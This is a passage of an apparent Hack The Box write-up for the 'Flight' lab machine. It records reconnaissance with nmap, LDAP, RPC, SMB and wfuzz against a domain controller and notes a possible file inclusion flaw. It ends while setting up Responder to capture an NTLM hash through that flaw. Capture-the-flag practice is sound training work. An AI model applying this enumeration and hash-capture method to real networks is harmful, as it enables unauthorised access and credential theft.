+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 00:12 -05
+Nmap scan report for 10.10.11.187
+Host is up (0.12s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+| ldap-rootdse: 
+| LDAP Results
+|   &lt;ROOT&gt;
+|       domainFunctionality: 7
+|       forestFunctionality: 7
+|       domainControllerFunctionality: 7
+|       rootDomainNamingContext: DC=flight,DC=htb
+|       ldapServiceName: flight.htb:g0$@FLIGHT.HTB
+|       isGlobalCatalogReady: TRUE
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxPercentDirSyncRequests
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxBatchReturnMessages
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxDirSyncDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: MaxValRangeTransitive
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedControl: 1.2.840.113556.1.4.2090
+|       supportedControl: 1.2.840.113556.1.4.2205
+|       supportedControl: 1.2.840.113556.1.4.2204
+|       supportedControl: 1.2.840.113556.1.4.2206
+|       supportedControl: 1.2.840.113556.1.4.2211
+|       supportedControl: 1.2.840.113556.1.4.2239
+|       supportedControl: 1.2.840.113556.1.4.2255
+|       supportedControl: 1.2.840.113556.1.4.2256
+|       supportedControl: 1.2.840.113556.1.4.2309
+|       supportedControl: 1.2.840.113556.1.4.2330
+|       supportedControl: 1.2.840.113556.1.4.2354
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       supportedCapabilities: 1.2.840.113556.1.4.2237
+|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=flight,DC=htb
+|       serverName: CN=G0,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=flight,DC=htb
+|       schemaNamingContext: CN=Schema,CN=Configuration,DC=flight,DC=htb
+|       namingContexts: DC=flight,DC=htb
+|       namingContexts: CN=Configuration,DC=flight,DC=htb
+|       namingContexts: CN=Schema,CN=Configuration,DC=flight,DC=htb
+|       namingContexts: DC=DomainDnsZones,DC=flight,DC=htb
+|       namingContexts: DC=ForestDnsZones,DC=flight,DC=htb
+|       isSynchronized: TRUE
+|       highestCommittedUSN: 122984
+|       dsServiceName: CN=NTDS Settings,CN=G0,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=flight,DC=htb
+|       dnsHostName: g0.flight.htb
+|       defaultNamingContext: DC=flight,DC=htb
+|       currentTime: 20250213121217.0Z
+|_      configurationNamingContext: CN=Configuration,DC=flight,DC=htb
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+Service Info: Host: G0; OS: Windows
+
+Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-81da-880c-eb4e3abfade2" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ ldapsearch -x -H ldap://10.10.11.187                      
+# extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+</code></pre><h2 id="199d1b9f-8847-8146-a220-d5a806794ba2" class="">RPC → 135 port</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8169-9a65-d25a276d5ded" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ rpcclient -U &quot;&quot; -N 10.10.11.187
+rpcclient $&gt; querydispinfo
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $&gt; enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre><h2 id="199d1b9f-8847-8193-8ac9-e7bc0c977047" class="">SMB Enumeration → 445 port</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-81f0-bc2e-c9b266c776f3" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">                                                                                                                
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ enum4linux -a 10.10.11.187 
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb 13 00:17:15 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.11.187
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.11.187 )============================
+
+
+[E] Can&#x27;t find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for 10.10.11.187 )================================
+
+Looking up status of 10.10.11.187
+No reply from 10.10.11.187
+
+ ===================================( Session Check on 10.10.11.187 )===================================
+
+
+[+] Server 10.10.11.187 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.11.187 )================================
+
+Domain Name: flight
+Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ===================================( OS information on 10.10.11.187 )===================================
+
+
+[E] Can&#x27;t get OS info with smbclient
+
+
+[+] Got OS info for 10.10.11.187 from srvinfo: 
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ =======================================( Users on 10.10.11.187 )=======================================
+
+
+[E] Couldn&#x27;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+
+
+[E] Couldn&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+
+ =================================( Share Enumeration on 10.10.11.187 )=================================
+
+do_connect: Connection to 10.10.11.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.11.187
+
+
+ ============================( Password Policy Information for 10.10.11.187 )============================
+
+
+[E] Unexpected error from polenum:
+
+
+
+[+] Attaching to 10.10.11.187 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:10.10.11.187)
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+
+[E] Failed to get password policy with rpcclient
+
+
+
+ =======================================( Groups on 10.10.11.187 )=======================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ==================( Users on 10.10.11.187 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+
+ ===============================( Getting printer info for 10.10.11.187 )===============================
+
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Thu Feb 13 00:17:56 2025
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8171-a2ec-de26ff94724a" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ smbclient -L 10.10.11.187   
+Password for [WORKGROUP\drroot]:
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                        
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-817d-8e89-d2711fd9e2d4" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ netexec smb 10.10.11.187 
+SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+
+</code></pre><h2 id="199d1b9f-8847-8134-8396-f8cb5210f37c" class="">Web Tech enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8194-b6ed-efc9e50464b8" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ whatweb &quot;http://flight.htb/&quot; -a 3  
+http://flight.htb/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.10.11.187], JQuery[1.4.2], OpenSSL[1.1.1m], PHP[8.1.1], Script[text/javascript], Title[g0 Aviation]
+                                    </code></pre><figure id="199d1b9f-8847-80cd-9935-dc9ff1fba10b" class="image"><a href="../img/Flight/image 1.png"><img style="width:709.984375px" src="../img/Flight/image 1.png"/></a></figure><h2 id="199d1b9f-8847-8109-a8b6-f769df6e2ded" class="">Findings</h2><ul id="199d1b9f-8847-813a-a159-c4340ac225ee" class="bulleted-list"><li style="list-style-type:disc">No information recoleted from AD</li></ul><ul id="199d1b9f-8847-801f-a67a-dc6d72cf9d2a" class="bulleted-list"><li style="list-style-type:disc">PHP → Maybe LFI</li></ul><ul id="199d1b9f-8847-8000-acea-f63d00a225c7" class="bulleted-list"><li style="list-style-type:disc">Trying to recolect info from web</li></ul><p id="199d1b9f-8847-8035-b6ac-fec89d72c5ea" class="">
+</p><h2 id="199d1b9f-8847-80c8-8069-d0821d5d3fec" class="">Directory Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-800f-997f-ec5a4a8afb7d" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">                                                                                                                
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://flight.htb/FUZZ -t 50 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://flight.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000000015:   301        9 L      30 W       330 Ch      &quot;css&quot;                                           
+000000002:   301        9 L      30 W       333 Ch      &quot;images&quot;                                        
+000000009:   301        9 L      30 W       329 Ch      &quot;js&quot;                                            
+000000189:   301        9 L      30 W       333 Ch      &quot;Images&quot;                                        
+000000156:   403        11 L     47 W       418 Ch      &quot;webalizer&quot;                                     
+000000300:   403        11 L     47 W       418 Ch      &quot;phpmyadmin&quot;                                    
+000000363:   301        9 L      30 W       330 Ch      &quot;CSS&quot;                                           
+000000707:   301        9 L      30 W       329 Ch      &quot;JS&quot;                                            
+000000519:   503        11 L     44 W       399 Ch      &quot;examples&quot;                                      
+000001008:   301        9 L      30 W       330 Ch      &quot;Css&quot;                                           
+000000989:   301        9 L      30 W       329 Ch      &quot;Js&quot;                                            
+000001705:   301        9 L      30 W       333 Ch      &quot;IMAGES&quot;                                        
+000004182:   403        11 L     47 W       418 Ch      &quot;licenses&quot;                                      
+000004255:   200        154 L    530 W      7069 Ch     &quot;http://flight.htb/&quot;                            
+000004227:   403        11 L     47 W       418 Ch      &quot;server-status&quot;                                 
+000006376:   403        9 L      30 W       299 Ch      &quot;con&quot;                                           
+000011490:   403        9 L      30 W       299 Ch      &quot;aux&quot;                                           
+000026988:   403        9 L      30 W       299 Ch      &quot;prn&quot;                                           
+000027651:   403        11 L     47 W       418 Ch      &quot;server-info&quot;                                   
+
+Total time: 0
+Processed Requests: 29950
+Filtered Requests: 29931
+Requests/sec.: 0
+
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8072-bedb-d93d5669864d" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://flight.htb/FUZZ -t 50 --hc 404 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://flight.htb/FUZZ
+Total requests: 220559
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+                            
+000000203:   301        9 L      30 W       333 Ch      &quot;Images&quot;                                        
+000000550:   301        9 L      30 W       330 Ch      &quot;css&quot;                                           
+000000953:   301        9 L      30 W       329 Ch      &quot;js&quot;                                            
+000000902:   503        11 L     44 W       399 Ch      &quot;examples&quot;                                      
+000001819:   403        11 L     47 W       418 Ch      &quot;licenses&quot;                                      
+000003673:   301        9 L      30 W       333 Ch      &quot;IMAGES&quot;                                        
+000003790:   403        9 L      30 W       299 Ch      &quot;%20&quot;                                           
+000007004:   403        9 L      30 W       299 Ch      &quot;*checkout*&quot;                                    
+000008475:   301        9 L      30 W       330 Ch      &quot;CSS&quot;                                           
+000009137:   301        9 L      30 W       329 Ch      &quot;JS&quot;                                            
+000010825:   403        11 L     47 W       418 Ch      &quot;phpmyadmin&quot;                                    
+000014028:   403        11 L     47 W       418 Ch      &quot;webalizer&quot;                                     
+000015463:   403        9 L      30 W       299 Ch      &quot;*docroot*&quot;                                     
+000016413:   403        9 L      30 W       299 Ch      &quot;*&quot;                                             
+000018007:   403        9 L      30 W       299 Ch      &quot;con&quot;                                           
+000031867:   403        9 L      30 W       299 Ch      &quot;http%3A&quot;                                       
+000035659:   403        9 L      30 W       299 Ch      &quot;**http%3a&quot;                                     
+000039207:   403        9 L      30 W       299 Ch      &quot;*http%3A&quot;                                      
+000045240:   200        154 L    530 W      7069 Ch     &quot;http://flight.htb/&quot;                            
+000047456:   403        9 L      30 W       299 Ch      &quot;aux&quot;                                           
+000055407:   403        9 L      30 W       299 Ch      &quot;**http%3A&quot;                                     
+000064268:   403        9 L      30 W       299 Ch      &quot;%C0&quot;     </code></pre><p id="199d1b9f-8847-80e1-8f6e-e08e9f8b3e6d" class="">
+</p><p id="199d1b9f-8847-8041-a4a1-ef9a98bd2919" class="">
+</p><h2 id="199d1b9f-8847-8013-bdc4-f0fcc0745056" class="">DNS Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8074-b08f-d281af49c884" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">                                                                                                                
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u &quot;http://flight.htb/&quot; -H &quot;Host:FUZZ.flight.htb&quot; -t 50 --hh 7069 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://flight.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000000624:   200        90 L     412 W      3996 Ch     &quot;school&quot;                                        
+000009532:   400        10 L     37 W       326 Ch      &quot;#www&quot;                                          
+000010581:   400        10 L     37 W       326 Ch      &quot;#mail&quot;                                         
+
+Total time: 0
+Processed Requests: 19966
+Filtered Requests: 19963
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-809f-8b28-e4eb8c4df56c" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u &quot;http://flight.htb/&quot; -H &quot;Host:FUZZ.flight.htb&quot; -t 50 --hh 7069 
+</code></pre><h3 id="199d1b9f-8847-80b9-9ec3-dc342bb83a01" class="">Add New subdomain to /etc/hosts</h3><figure id="199d1b9f-8847-80f8-9243-fda1eaec0cb6" class="image"><a href="../img/Flight/image 2.png"><img style="width:460px" src="../img/Flight/image 2.png"/></a></figure><h3 id="199d1b9f-8847-80b2-810e-e77b52b7d2a6" class="">New Web</h3><figure id="199d1b9f-8847-8029-8085-e5c6cc08012a" class="image"><a href="../img/Flight/image 3.png"><img style="width:709.9375px" src="../img/Flight/image 3.png"/></a></figure><h3 id="199d1b9f-8847-8006-82d0-f95f77b64226" class="">Let’s start with burpsuite and that kind of hacker tools</h3><h3 id="199d1b9f-8847-80e9-b221-fbe251f2d1a6" class="">Nothing interesting on flight.htb, let’s see school.flight.htb</h3><h3 id="199d1b9f-8847-806a-b537-cbbd612803e3" class="">Possible LFI(remember page uses php)</h3><figure id="199d1b9f-8847-8010-87ca-fd6bd35edde9" class="image"><a href="../img/Flight/image 4.png"><img style="width:709.96875px" src="../img/Flight/image 4.png"/></a></figure><h1 id="199d1b9f-8847-815e-9155-c8a5bb48da65" class="">User</h1><h3 id="199d1b9f-8847-80aa-83c0-e6bc736aad13" class="">Let’s try starting responder and writing our smb ip to get the hash </h3><figure id="199d1b9f-8847-8081-8e2d-cf2ed3ab6c8f" class="image"><a href="../img/Flight/image 5.png"><img style="width:709.984375px" src="../img/Flight/image 5.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8011-aa85-c2443067e645" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.23]
+    Responder IPv6             [dead:beef:2::1015]
+    Challenge set              [random]
+    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;, &#x27;ISATAP.LOCAL&#x27;]
+
+[+] Current Session Variables:
